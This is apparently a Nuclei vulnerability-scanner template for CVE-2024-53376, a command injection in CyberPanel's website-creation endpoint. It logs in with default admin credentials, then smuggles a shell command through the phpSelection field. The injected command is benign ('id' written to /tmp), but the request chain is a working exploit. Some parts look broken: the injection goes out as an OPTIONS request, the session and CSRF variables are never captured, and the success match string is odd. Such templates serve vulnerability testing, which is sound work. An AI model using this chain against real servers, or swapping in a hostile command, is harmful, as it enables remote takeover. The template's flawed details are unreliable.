id: CVE-2024-53376

info:
  name: CyberPanel - Authenticated Remote Code Execution (RCE)
  author: Ryan Putman
  severity: critical
  description: |
    Command injection vulnerability in the submitWebsiteCreation endpoint of CyberPanel < 2.3.8.
  reference:
    - https://github.com/ThottySploity/CVE-2024-53376
  tags: cve,cve2024,rce,cyberpanel

requests:
  - method: POST
    path:
      - "{{BaseURL}}/verifyLogin"
    headers:
      Accept: application/json
      Origin: https://localhost:8090
      Referer: https://localhost:8090/
      Connection: close
    body: |
      {
        "username": "admin",
        "password": "admin",
        "languageSelection": "english"
      }
    matchers:
      - type: word
        part: headers
        words:
          - "sessionid="
        condition: and
      - type: status
        status:
          - 200

  - method: OPTIONS
    path:
      - "{{BaseURL}}/websites/submitWebsiteCreation"
    headers:
      Cookie: "csrftoken={{csrf_token}}; django_language=en; sessionid={{session_id}}"
      Accept: application/json
      X-Csrftoken: "{{csrf_token}}"
      Origin: https://localhost:8090
      Referer: https://localhost:8090/
      Connection: close
    body: |
      {
        "package": "Default",
        "domainName": "cyberpanel.net",
        "adminEmail": "cyberpanel@gmail.com",
        "phpSelection": "PHP 8.0'; id > /tmp/nuclei_rce_test; #",
        "ssl": 0,
        "websiteOwner": "admin",
        "dkimCheck": 0,
        "openBasedir": 0,
        "mailDomain": 0,
        "apacheBackend": 0
      }
    matchers:
      - type: word
        part: status
        words:
          - 200
        condition: and
      - type: word
        part: body
        words:
          - "Exploit succeeded"
